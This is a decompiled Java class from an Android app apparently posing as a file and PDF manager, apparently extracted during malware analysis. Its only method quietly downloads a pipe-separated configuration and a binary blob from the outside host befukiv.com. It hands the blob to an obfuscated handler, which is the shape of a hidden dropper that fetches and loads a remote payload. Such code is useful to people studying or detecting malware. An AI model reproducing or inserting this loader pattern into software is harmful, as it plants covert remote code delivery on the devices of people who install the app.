package e5;

import g6.i;
import java.lang.reflect.Method;
import java.nio.charset.Charset;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;
import y4.d;
import y4.o;
import y4.p;
import y4.r;
import y4.t;
import z4.h;
/* loaded from: /home/remnux/original_apks/com.tragisoap.fileandpdfmanager/classes.dex */
public final class m {

    /* renamed from: a  reason: collision with root package name */
    public static Method f3832a;

    /* renamed from: b  reason: collision with root package name */
    public static Method f3833b;

    /* renamed from: c  reason: collision with root package name */
    public static Method f3834c;

    /* renamed from: d  reason: collision with root package name */
    public static Method f3835d;
    public static Method e;

    /* renamed from: f  reason: collision with root package name */
    public static Method f3836f;

    /* renamed from: g  reason: collision with root package name */
    public static AtomicReference<String[]> f3837g = new AtomicReference<>();

    /* renamed from: h  reason: collision with root package name */
    public static final i f3838h = new i(7);

    /* renamed from: i  reason: collision with root package name */
    public static AtomicBoolean f3839i = new AtomicBoolean();

    public static void a() {
        String str;
        p pVar = new p();
        r.a aVar = new r.a();
        aVar.c("https://befukiv.com/muchaspuchas");
        r a7 = aVar.a();
        r.a aVar2 = new r.a();
        aVar2.c("https://befukiv.com/cortina");
        r a8 = aVar2.a();
        try {
            t tVar = new d(pVar, a7).a().f6804g;
            byte[] b2 = tVar.b();
            o e7 = tVar.e();
            Charset charset = h.f6957c;
            if (!(e7 == null || (str = e7.f6764b) == null)) {
                charset = Charset.forName(str);
            }
            f3837g.set(new String(b2, charset.name()).split("\\|"));
            byte[] b7 = new d(pVar, a8).a().f6804g.b();
            if (!f3839i.get()) {
                f3838h.getClass();
                i.h(b7);
                f3839i.set(true);
            }
        } catch (Throwable th) {
            th.printStackTrace();
        }
    }
}
